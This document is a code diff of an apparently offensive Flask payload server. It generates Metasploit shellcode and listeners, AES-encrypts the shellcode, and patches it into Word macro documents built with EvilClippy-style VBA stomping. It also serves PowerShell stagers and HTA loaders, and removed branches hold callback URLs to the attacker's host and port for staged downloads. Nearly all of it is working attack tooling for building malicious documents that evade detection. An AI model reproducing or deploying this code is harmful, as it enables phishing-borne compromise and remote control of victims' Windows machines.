@@ -194,58 +194,6 @@ def generate_word_file(template_path: str, encrypted_payloads: List[bytes], stom
     return file_data
 
 
-def generate_word_file_aes(template_path: str, encrypted_payloads: List[bytes], stomp_vba: bool) -> Optional[BytesIO]:
-    file_data, ole = open_word_template(template_path)
-
-    for x in encrypted_payloads:
-        print(len(x))
-        print(f"{(len(x)):04X}")
-        print(','.join(str(b) for b in x))
-
-    data_to_write = (''.join(map(
-        lambda x: f"{(len(x)):04X}{binascii.hexlify(x).decode().upper()}", encrypted_payloads))).encode()
-
-    if not file_data:
-        return None
-
-    contents = ole.openstream("WordDocument").read()
-    offset, length = findmarker(contents)
-
-    if offset != -1:
-        logger.info(
-            f"Marker found in document at: [{offset}] length: [{length}]")
-
-        if length < len(data_to_write):
-            logger.error(
-                f"Payload is too big for document! ({len(data_to_write)} > {length})")
-            return None
-
-        contents = replacemarker(contents, offset, data_to_write)
-        ole.write_stream(f"WordDocument", contents)
-
-    if stomp_vba:
-        dir_stream = decompress_stream(ole.openstream("Macros/VBA/dir").read())
-
-        module_offsets = get_vba_offsets(dir_stream)
-
-        # We have messed up the mapping between modules and OLE paths using EvilClippy, so pick the largest offset and put it in NewMacros
-        biggest_offset = sorted(module_offsets.items(),
-                                key=lambda x: x[1], reverse=True)[0][1]
-        contents = ole.openstream(f"Macros/VBA/NewMacros").read()
-        contents = contents[:biggest_offset].ljust(len(contents), b'\x00')
-        ole.write_stream(f"Macros/VBA/NewMacros", contents)
-
-        # for directory, vba_offset in module_offsets.items():
-        #     contents = ole.openstream(f"Macros/VBA/{directory}").read()
-        #     contents = contents[:vba_offset].ljust(len(contents), b'\x00')
-        #     ole.write_stream(f"Macros/VBA/{directory}", contents)
-
-    ole.close()
-    file_data.seek(0)
-
-    return file_data
-
-
 def powershell_base64(command):
     command_bytes = command.encode('utf-16le')
     base64_encoded = base64.b64encode(command_bytes)
@@ -653,7 +601,6 @@ with open('templates/WIN_START.ps1', 'r') as f:
 with open('templates/WIN_BYPASS.ps1', 'r') as f:
     WIN_BYPASS_TEMPLATE = f.read().strip()
 
-
 with open('templates/WIN_LOADER_32.ps1', 'r') as f:
     WIN_LOADER_32_TEMPLATE = f.read().strip()
 
@@ -691,29 +638,36 @@ def ps(id, stage, proxy=False):
         return render_template_string(WIN_START_TEMPLATE, host=host, id=clean_id, type=payload_type, proxy=proxy)
 
     if stage == 'delegate':
-        setup_listener(
-            lhost,
-            lport,
-            LISTENER_CONFIGS["PS_HTTPS"] | {
-                "LURI": f"/ms/{clean_id}/",
-                "HttpProxyIE": proxy
-            }
+        payloads_generated = gen_multiple_payloads_ps1(
+            lhost, lport, proxy, clean_id, config="PS_HTTPS", endpoint="ms", archs=[64]
         )
+        payload_x64 = encrypt_ps_payload(payloads_generated[64])
+        return render_template_string(WIN_DELEGATE_TEMPLATE, bytes=payload_x64)
+    # if stage == 'delegate':
+    #     setup_listener(
+    #         lhost,
+    #         lport,
+    #         LISTENER_CONFIGS["PS_HTTPS"] | {
+    #             "LURI": f"/ms/{clean_id}/",
+    #             "HttpProxyIE": proxy
+    #         }
+    #     )
 
-        raw_payload_file = generate_payload(
-            LISTENER_CONFIGS["PS_HTTPS"]["Payload"],
-            lhost,
-            lport,
-            'raw',
-            [
-                {
-                    "LURI": f"/ms/{clean_id}/",
-                    "HttpProxyIE": proxy
-                }
-            ]
-        )
-        ps_string = encrypt_ps_payload(raw_payload_file)
-        return render_template_string(WIN_DELEGATE_TEMPLATE, bytes=ps_string)
+    #     raw_payload_file = generate_payload(
+    #         LISTENER_CONFIGS["PS_HTTPS"]["Payload"],
+    #         lhost,
+    #         lport,
+    #         'raw',
+    #         [
+    #             {
+    #                 "LURI": f"/ms/{clean_id}/",
+    #                 "HttpProxyIE": proxy
+    #             }
+    #         ]
+    #     )
+    #     ps_string = encrypt_ps_payload(raw_payload_file)
+    #     return render_template_string(WIN_DELEGATE_TEMPLATE, bytes=ps_string)
+
 
 
 @win.route('/ps/<id>/<stage>')
@@ -819,10 +773,6 @@ def word_form():
     print(f"{ladapter=}")
     print(f"{lport=}")
     print(f"{uid=}")
-    # if adapter == "":
-    #     adapter = "tun0"
-    # os.popen('ip a s ' + adapter + ''' | grep 'inet ' | awk '{print $2}' | sed 's/\/.*//g' ''').read()
-    # get_ip()
     template = template.replace(
         'name="lhost" value=""', f'name="lhost" value="{get_ip(ladapter)}"')
     template = template.replace(
@@ -863,6 +813,175 @@ def gen_multiple_payloads(lhost, lport, proxy, id, config="VBA", endpoint="ms", 
         retval[arch] = a
     return retval
 
+def gen_multiple_payloads_ps1(lhost, lport, proxy, id, config="PS_HTTPS", endpoint="ms", archs=[64]):
+    retval = {}
+    print(f"{archs=}")
+    for arch in archs:
+        setup_listener(
+            lhost,
+            lport,
+            LISTENER_CONFIGS[config] | {
+                "LURI": f"/{endpoint}/{id}/",
+                "HttpProxyIE": proxy
+            }
+        )
+
+        retval[64] = generate_payload(
+            LISTENER_CONFIGS[config]["Payload"],
+            lhost,
+            lport,
+            'raw',
+            [
+                {
+                    "LURI": f"/{endpoint}/{id}/",
+                    "HttpProxyIE": proxy
+                }
+            ]
+        )
+    return retval
+
+
+def msgbox_generator(archs=[32, 64]):
+    retval = {}
+    for i in archs:
+        payload = "windows/x64/messagebox"
+        if archs == 32:
+            payload = "windows/messagebox"
+        retval[i] = generate_payload(
+            payload,
+            None,
+            None,
+            'raw',
+            [
+                {
+                    "Title": f"{str(i)} bit"
+                }
+            ]
+        )
+    return retval
+
+
+
+
+def generate_word_file_aes(template_path: str, encrypted_payloads: List[bytes], stomp_vba: bool) -> Optional[BytesIO]:
+    with os.popen("(cd /mnt/exploits/vba/generator ; ./build-single-stage.sh)") as f:
+        res = f.read()
+    return res
+    # return file_data
+
+import base64
+from pathlib import Path
+
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+from Crypto.Random import get_random_bytes
+from Crypto.Hash import SHA256
+
+EGG_START = b"START_AES_HERE_"
+EGG_END   = b"_END_AES_HERE"
+
+PWD_START = b"PASSWORD_START_"
+PWD_END   = b"_PASSWORD_STOP"
+
+SALT_HEADER = b"Salted__"
+
+
+first_PADDING=b"\x00"
+rest_PADDING=b"\x20"
+
+def openssl_pbkdf2_encrypt(plaintext: bytes, password: str) -> bytes:
+    salt = get_random_bytes(8)
+    key_iv = PBKDF2(password.encode(), salt, dkLen=48, count=10_000, hmac_hash_module=SHA256)
+    key, iv = key_iv[:32], key_iv[32:]
+
+    pad_len = 16 - (len(plaintext) % 16)
+    padded = plaintext + bytes([pad_len]) * pad_len
+
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    encrypted = cipher.encrypt(padded)
+
+    return base64.b64encode(SALT_HEADER + salt + encrypted)
+
+
+def patch_document(doc_path: Path, shellcode_path: Path, out_path: Path, password: str):
+    doc_data = doc_path.read_bytes()
+    raw_shellcode = shellcode_path.read_bytes()
+
+    print(f"[+] Loaded {len(raw_shellcode)} bytes of shellcode from '{shellcode_path}'.")
+
+    b64_payload = openssl_pbkdf2_encrypt(raw_shellcode, password)
+
+    egg_start_idx = doc_data.find(EGG_START)
+    if egg_start_idx == -1:
+        raise ValueError("START_AES_HERE marker not found")
+    egg_end_idx = doc_data.find(EGG_END, egg_start_idx)
+    if egg_end_idx == -1:
+        raise ValueError("_END_AES_HERE marker not found")
+
+    egg_region_len = egg_end_idx - egg_start_idx  # not incl. END marker
+    if len(b64_payload) > egg_region_len:
+        raise ValueError(
+            f"Encrypted payload ({len(b64_payload)} B) exceeds region ({egg_region_len} B)"
+        )
+
+    padded_payload = b64_payload + first_PADDING + rest_PADDING * (egg_region_len - len(b64_payload) - 1)
+    patched = (
+        doc_data[:egg_start_idx]
+        + padded_payload
+        + doc_data[egg_end_idx:]
+    )
+
+    b64_pass = base64.b64encode(password.encode())
+
+    pwd_start_idx = patched.find(PWD_START)
+    if pwd_start_idx == -1:
+        raise ValueError("PASSWORD_START_ marker not found")
+    pwd_end_idx = patched.find(PWD_END, pwd_start_idx)
+    if pwd_end_idx == -1:
+        raise ValueError("_PASSWORD_STOP marker not found")
+
+    pwd_region_start = pwd_start_idx
+    pwd_region_end   = pwd_end_idx + len(PWD_END)
+    pwd_region_len   = pwd_region_end - pwd_region_start
+
+    if len(b64_pass) > pwd_region_len:
+        raise ValueError(
+            f"Base‑64 password ({len(b64_pass)} B) exceeds region ({pwd_region_len} B)"
+        )
+
+    padded_b64_pass = b64_pass + first_PADDING + rest_PADDING * (pwd_region_len - len(b64_pass) - 1)
+    patched = (
+        patched[:pwd_region_start]
+        + padded_b64_pass
+        + patched[pwd_region_end:]
+    )
+
+    out_path.write_bytes(patched)
+
+    print(
+        f"[+] Patched '{out_path}'. Inserted {len(b64_payload)}‑byte payload "
+        f"and embedded {len(b64_pass)}‑byte password (region sizes preserved)."
+    )
+
+@win.route('rsa/<id>/payload', methods=['GET'])
+def rsa_payload(id):
+    password = request.args.get('password')
+    lhost = request.args.get('lhost')
+    lport = request.args.get('lport')
+    architecture = request.args.get('architecture', 32)
+    proxy = ('system_proxy' in request.form.keys())
+    architecture = int(architecture)
+    id = request.args.get('id')
+    clean_id = filter_string(id)
+    if clean_id == "":
+        return "Invalid id", 400
+    
+    payloads = gen_multiple_payloads(
+        lhost, lport, proxy, id, config="VBA", endpoint="ms", archs=[architecture]
+    )
+
+    b64_blob = openssl_pbkdf2_encrypt(payloads[architecture].encode('latin-1'), password)
+    return b64_blob
 
 @win.route('/word_form/get', methods=['POST'])
 def word_get():
@@ -878,137 +997,32 @@ def word_get():
         return "Invalid id", 400
 
     if payload_type == "vba_shellcode":
-        setup_listener(
-            lhost,
-            lport,
-            LISTENER_CONFIGS["VBA_32"] | {
-                "LURI": f"/ms/{clean_id}_32/",
-                "HttpProxyIE": proxy,
-            }
-        )
-
-        setup_listener(
-            lhost,
-            lport,
-            LISTENER_CONFIGS["VBA_64"] | {
-                "LURI": f"/ms/{clean_id}_64/",
-                "HttpProxyIE": proxy
-            }
-        )
-
-        raw_payload_file_32 = generate_payload(
-            LISTENER_CONFIGS["VBA_32"]["Payload"],
-            lhost,
-            lport,
-            'raw',
-            [
-                {
-                    "LURI": f"/ms/{clean_id}_32/",
-                    "EXITFUNC": "thread",
-                    "HttpProxyIE": proxy,
-                }
-            ]
-        )
-
-        raw_payload_file_64 = generate_payload(
-            LISTENER_CONFIGS["VBA_64"]["Payload"],
-            lhost,
-            lport,
-            'raw',
-            [
-                {
-                    "LURI": f"/ms/{clean_id}_64/",
-                    "EXITFUNC": "thread",
-                    "HttpProxyIE": proxy,
-                }
-            ]
-        )
-
-        encrypted_bytes_32 = encrypt_raw_payload(raw_payload_file_32)
-        encrypted_bytes_64 = encrypt_raw_payload(raw_payload_file_64)
+        payloads = gen_multiple_payloads(
+            lhost, lport, proxy, id, config="VBA", endpoint="ms", archs=[32, 64])
         template_path = "payload_holders/shellcode_runner_obfs_EvilClippy.doc"
-
+        word_file_stream = generate_word_file(
+            template_path, [encrypt_raw_payload(payloads[32]), encrypt_raw_payload(payloads[64])], stomp_vba)
+    elif payload_type == "rsa_shellcode_revshell":
+        payloads = msgbox_generator(archs=[32, 64])
+        encrypted_bytes_32 = payloads[32]
+        encrypted_bytes_64 = payloads[64]
+        template_path = "payload_holders/shellcode_runner_obfs_EvilClippy.doc"
+        word_file_stream = generate_word_file_aes(
+            template_path, [encrypted_bytes_32, encrypted_bytes_64], stomp_vba)
+    elif payload_type == "rsa_shellcode_pingback":
+        payloads = msgbox_generator(archs=[32, 64])
+        encrypted_bytes_32 = payloads[32]
+        encrypted_bytes_64 = payloads[64]
+        template_path = "payload_holders/shellcode_runner_obfs_EvilClippy.doc"
         word_file_stream = generate_word_file(
             template_path, [encrypted_bytes_32, encrypted_bytes_64], stomp_vba)
-    elif payload_type == "messagebox_msf":
-        raw_payload_file_32 = generate_payload(
-            "windows/messagebox",
-            None,
-            None,
-            'raw',
-            [
-                {
-                    "Title": f"32 bit"
-                }
-            ]
-        )
-
-        raw_payload_file_64 = generate_payload(
-            "windows/x64/messagebox",
-            None,
-            None,
-            'raw',
-            [
-                {
-                    "Title": f"64 bit"
-                }
-            ]
-        )
-
-        encrypted_bytes_32 = encrypt_raw_payload(raw_payload_file_32)
-        encrypted_bytes_64 = encrypt_raw_payload(raw_payload_file_64)
-        template_path = "payload_holders/shellcode_runner_obfs_EvilClippy.doc"
-
-        word_file_stream = generate_word_file(
-            template_path, [encrypted_bytes_32, encrypted_bytes_64], stomp_vba)
-    elif payload_type == "powershell_runner":
-        template_path = "payload_holders/powershell_obfs_EvilClippy.doc"
-
-        if proxy:
-            ps_type = "ps_proxy"
-        else:
-            ps_type = "ps"
-
-        url = bytearray(
-            f"http://{lhost}:{lport}/p/win/{ps_type}/{clean_id}/start".encode())
-        encrypted_bytes = encrypt_raw_payload_bytes(url)
-        word_file_stream = generate_word_file(
-            template_path, [encrypted_bytes], stomp_vba)
-    elif payload_type == "powershell_wmi":
-        template_path = "payload_holders/wmi_exec_obfs_EvilClippy.doc"
-
-        if proxy:
-            ps_type = "ps_proxy"
-        else:
-            ps_type = "ps"
-
-        url = bytearray(
-            f"http://{lhost}:{lport}/p/win/{ps_type}/{clean_id}/start".encode())
-        encrypted_bytes = encrypt_raw_payload_bytes(url)
-        word_file_stream = generate_word_file(
-            template_path, [encrypted_bytes], stomp_vba)
-    elif payload_type == "messagebox":
-        template_path = "payload_holders/msgbox_obfs_EvilClippy.doc"
-
-        url = bytearray(
-            f"http://{lhost}:{lport}/p/win/ps/{clean_id}/start".encode())
-        encrypted_bytes = encrypt_raw_payload_bytes(url)
-        word_file_stream = generate_word_file(
-            template_path, [encrypted_bytes], stomp_vba)
-    elif payload_type == "callback":
-        template_path = "payload_holders/callback_obfs_EvilClippy.doc"
-
-        url = bytearray(f"http://{lhost}:{lport}/p/info/get".encode())
-        encrypted_bytes = encrypt_raw_payload_bytes(url)
-        word_file_stream = generate_word_file(
-            template_path, [encrypted_bytes], stomp_vba)
     else:
         return "Invalid type", 400
 
     return send_file(
         word_file_stream,
         as_attachment=False,
-        download_name='document.doc',
+        download_name=f'{id}.doc',
         mimetype='application/octet-stream'
     )
 
@@ -1049,7 +1063,7 @@ def hta_get():
     return send_file(
         bytes_io,
         as_attachment=False,
-        download_name='loader.hta',
+        download_name=f"{clean_id}.hta",
         mimetype='application/octet-stream'
     )
 
